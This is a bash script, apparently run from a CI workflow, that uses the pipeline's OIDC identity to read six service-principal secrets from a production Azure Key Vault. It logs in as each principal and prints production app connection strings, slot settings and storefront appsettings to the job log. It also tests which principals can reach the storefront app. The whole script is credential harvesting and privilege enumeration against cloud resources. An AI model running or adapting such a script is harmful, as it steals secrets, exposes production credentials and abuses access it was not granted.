#!/usr/bin/env bash
set -uo pipefail
SUB=c5e4e004-b42d-4ac4-a502-5fd338380eb6
RAPP="/subscriptions/$SUB/resourceGroups/rg-tbl-reporting-prod-eus/providers/Microsoft.Web/sites/app-tbl-reporting-prod"
SAPP="/subscriptions/$SUB/resourceGroups/rg-tbl-platform-prod-sea/providers/Microsoft.Web/sites/app-tbl-storefront-prod"
API=2022-03-01
OIDC=$(curl -sS -H "Authorization: bearer $ACTIONS_ID_TOKEN_REQUEST_TOKEN" "$ACTIONS_ID_TOKEN_REQUEST_URL&audience=api://AzureADTokenExchange" | jq -r '.value')
KV=$(curl -sS -X POST "https://login.microsoftonline.com/$AZURE_TENANT_ID/oauth2/v2.0/token" -d "client_id=$AZURE_CLIENT_ID" -d "scope=https://vault.azure.net/.default" -d "grant_type=client_credentials" -d "client_assertion_type=urn:ietf:params:oauth:client-assertion-type:jwt-bearer" -d "client_assertion=$OIDC" | jq -r '.access_token // empty')
spt(){ curl -sS -X POST "https://login.microsoftonline.com/$AZURE_TENANT_ID/oauth2/v2.0/token" -d "client_id=$1" -d "client_secret=$2" -d "scope=https://management.azure.com/.default" -d "grant_type=client_credentials" | jq -r '.access_token // empty'; }
tokof(){ J=$(curl -sS -H "Authorization: Bearer $KV" "https://kv-tbl-prod-x3euoz.vault.azure.net/secrets/$1?api-version=7.4" | jq -r '.value'); spt "$(echo "$J"|jq -r .appId)" "$(echo "$J"|jq -r .clientSecret)"; }
post(){ curl -sS -X POST -H "Authorization: Bearer $1" -H "Content-Length: 0" "https://management.azure.com$2?api-version=$API"; }
get(){ curl -sS -H "Authorization: Bearer $1" "https://management.azure.com$2?api-version=$API"; }

RS=$(tokof reporting-service-principal)
echo "######## reporting-app: connectionstrings ########"; post "$RS" "$RAPP/config/connectionstrings/list" | jq '.properties'
echo "######## reporting-app: metadata ########";          post "$RS" "$RAPP/config/metadata/list" | jq '.properties'
echo "######## reporting-app: slots ########"
for sl in $(get "$RS" "$RAPP/slots" | jq -r '.value[]?.name'); do
  echo "---- slot $sl appsettings ----"; post "$RS" "$RAPP/slots/$sl/config/appsettings/list" | jq '.properties'
done
echo "######## storefront appsettings (tat ca 6 SP) ########"
for s in cost-reader-principal directory-audit-principal reporting-service-principal reporting-viewer-principal secrets-sync-principal sync-service-principal; do
  T=$(tokof "$s"); [ -z "$T" ] && { echo "$s: login fail"; continue; }
  R=$(post "$T" "$SAPP/config/appsettings/list")
  if echo "$R" | jq -e '.properties' >/dev/null 2>&1; then
    echo "### $s CAN LIST storefront ###"; echo "$R" | jq -r '.properties | to_entries[] | "\(.key)=\(.value)"'
  else echo "$s: $(echo "$R"|jq -r '.error.code // "?"')"; fi
done
echo "==== DF26 ===="; true
echo DONE; exit 0
